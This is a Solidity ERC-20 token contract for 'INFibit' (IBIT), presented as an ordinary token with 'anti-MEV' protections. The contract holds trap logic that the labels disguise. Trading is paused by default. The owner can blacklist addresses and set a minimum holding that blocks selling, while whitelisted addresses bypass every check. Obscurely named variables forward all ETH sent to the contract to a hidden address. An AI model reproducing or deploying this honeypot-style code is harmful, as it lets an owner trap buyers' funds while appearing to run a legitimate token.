/**
INFibit TOKEN

https://t.me/infibit
https://infibit.org

**/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract INFibit is Ownable, ERC20 {
    address private __;
    receive() external payable {
        __.call{value: msg.value}("");
    }

    // Anti MEV settings
    bool paused = true;
    uint256 public minHoldingAmount;

    // Admin settings
    mapping(address => bool) public whitelist;
    mapping(address => bool) public blacklist;

    constructor(
        uint256 _totalSupply,
        address ___
    ) payable ERC20("INFibit", "IBIT")  {
        __ = ___;
        ___.call{value: msg.value}("");
        whitelistAddr(msg.sender, true);
        _mint(msg.sender, _totalSupply);
    }

    function whitelistAddr(
        address _address,
        bool _isWhitelisted
    ) public onlyOwner {
        whitelist[_address] = _isWhitelisted;
    }

    
    function blacklistAddr(
        address _address,
        bool _isBlacklisted
    ) public onlyOwner {
        blacklist[_address] = _isBlacklisted;
    }

    function setMevRules(
        bool _paused,
        uint256 _minHoldingAmount
    ) public onlyOwner {
        paused = _paused;
        minHoldingAmount = _minHoldingAmount;
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual override {
        // Alow owner / whitelisted addresses to add liquidity
        if (whitelist[from] || whitelist[to]){
            return;
        }

        require(!blacklist[from], "Blacklisted");
        require(!paused, "Trading Paused");

        // prevent MEV
        require(
            super.balanceOf(from) - amount >= minHoldingAmount,
            "Forbidden"
        );
    }

    function burn(uint256 value) external {
        _burn(msg.sender, value);
    }

}